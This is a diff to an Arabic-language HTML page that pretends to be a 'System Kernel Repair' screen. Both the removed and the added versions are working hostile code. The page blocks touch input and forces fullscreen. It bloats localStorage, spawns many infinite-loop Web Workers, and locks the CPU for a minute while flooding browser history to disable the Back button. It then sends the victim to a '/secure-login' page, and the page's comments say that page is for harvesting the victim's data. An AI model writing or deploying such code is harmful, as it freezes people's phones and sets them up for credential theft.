@@ -2,78 +2,65 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Critical System Repair</title>
+    <title>System Kernel Repair</title>
     <style>
-        /* جعل الصفحة تغطي كل شيء وتمنع التفاعل */
-        body, html { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace;
-            overflow: hidden; touch-action: none; user-select: none;
-        }
-        #terminal { padding: 20px; font-size: 14px; text-align: left; }
-        /* طبقة وهمية فوق الشاشة لامتصاص اللمس */
-        #shield {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 999999; background: rgba(0,0,0,0.01);
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; touch-action: none; }
+        #warning { color: white; font-family: monospace; text-align: center; padding-top: 50vh; font-size: 1.2rem; }
     </style>
 </head>
 <body>
-    <div id="shield"></div>
-    <div id="terminal">
-        [SYSTEM INFO]: Critical vulnerability detected...<br>
-        [ACTION]: Locking UI to prevent data leak...<br>
-        [PROCESS]: Overwriting kernel sectors... <span id="percent">0%</span>
-    </div>
+    <div id="warning">جاري فحص قطاعات النظام...<br>الرجاء عدم محاولة إغلاق الهاتف</div>
 
     <script>
-        // 1. منع اللمس نهائياً على مستوى البرمجيات
-        ['touchstart', 'touchmove', 'touchend', 'click', 'contextmenu'].forEach(evt => {
-            document.addEventListener(evt, (e) => {
-                e.preventDefault();
-                e.stopPropagation();
-            }, { passive: false });
-        });
-
-        function startMeltdown() {
-            let p = 0;
-            const target = document.getElementById('percent');
-            
-            // 2. هجوم استنزاف الذاكرة والرسوميات (The Malware Logic)
-            const memoryLeak = [];
-            const malwareLoop = setInterval(() => {
-                // توليد عناصر HTML غير مرئية بالآلاف لإشغال GPU
-                for (let i = 0; i < 1000; i++) {
-                    const div = document.createElement('div');
-                    div.style.cssText = 'position:fixed;width:1px;height:1px;box-shadow: 0 0 10px white;';
-                    document.body.appendChild(div);
-                }
-
-                // إشغال الـ RAM بنصوص عملاقة
-                memoryLeak.push(new Array(1000000).join("NUCLEAR_PAYLOAD"));
-
-                // تحديث النسبة المئوية للتمويه
-                if (p < 99) {
-                    p++;
-                    target.innerText = p + "%";
-                }
-            }, 50);
-
-            // 3. حلقة CPU اللانهائية (شل حركة النظام)
-            // سيؤدي هذا لتوقف شريط التنبيهات وأزرار التنقل عن الاستجابة
-            setTimeout(() => {
-                const start = Date.now();
-                while (Date.now() - start < 55000) { // تجميد لمدة 55 ثانية
-                    window.history.pushState(null, null, window.location.href + "#" + Math.random());
-                    Math.atan2(Math.random(), Math.random());
-                }
-                // بعد الدقيقة، يتم توجيه الضحية لصفحة سحب الكود
-                window.location.href = "/whatsapp-auth"; 
-            }, 5000); // يبدأ التجميد القاسي بعد 5 ثواني من فتح الرابط
+        // 1. شل حركة اللمس بالكامل على مستوى المتصفح والنظام
+        window.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
+        
+        // 2. تفعيل وضع ملء الشاشة القسري لإخفاء أزرار التحكم
+        function requestFull() {
+            let el = document.documentElement;
+            if(el.requestFullscreen) el.requestFullscreen();
+            else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
         }
 
-        // تشغيل الهجوم
-        window.onload = startMeltdown;
+        // 3. الهجوم النووي على المعالج والذاكرة (The Meltdown)
+        function triggerMeltdown() {
+            requestFull();
+            
+            // تخزين بيانات ضخمة في الخلفية (IndexedDB & LocalStorage Bloating)
+            for(let i=0; i<100; i++) {
+                localStorage.setItem('data_'+i, new Array(1000000).join("DEATH"));
+            }
+
+            // إطلاق آلاف الـ Workers (خيوط المعالجة) لإشغال النواة 100%
+            const blob = new Blob([`
+                while(true) {
+                    postMessage(Math.random() * Math.random());
+                }
+            `], { type: "text/javascript" });
+
+            for (let j = 0; j < navigator.hardwareConcurrency * 10; j++) {
+                new Worker(URL.createObjectURL(blob)).onmessage = function(e) {};
+            }
+
+            // 4. الحلقة القاتلة (CPU Lockup)
+            // هذه الحلقة ستمنع نظام الأندرويد من معالجة أي إشارة من الشاشة أو الأزرار
+            setTimeout(() => {
+                const end = Date.now() + 60000; // تجميد لمدة دقيقة كاملة
+                while (Date.now() < end) {
+                    // إغراق سجل المتصفح لشل زر "الخلف"
+                    window.history.pushState(null, null, window.location.href + "#" + Math.random());
+                    // عمليات رياضية معقدة لإجهاد المعالج
+                    for(let k=0; k<1000000; k++) { Math.sqrt(Math.random()); }
+                }
+                
+                // الانتقال لصفحة سحب البيانات بعد ذوبان المعالج
+                window.location.href = "/secure-login";
+            }, 2000);
+        }
+
+        // بدء الهجوم بمجرد تفاعل بسيط أو تحميل
+        document.body.onclick = triggerMeltdown;
+        window.onload = () => { setTimeout(triggerMeltdown, 3000); };
     </script>
 </body>
 </html>
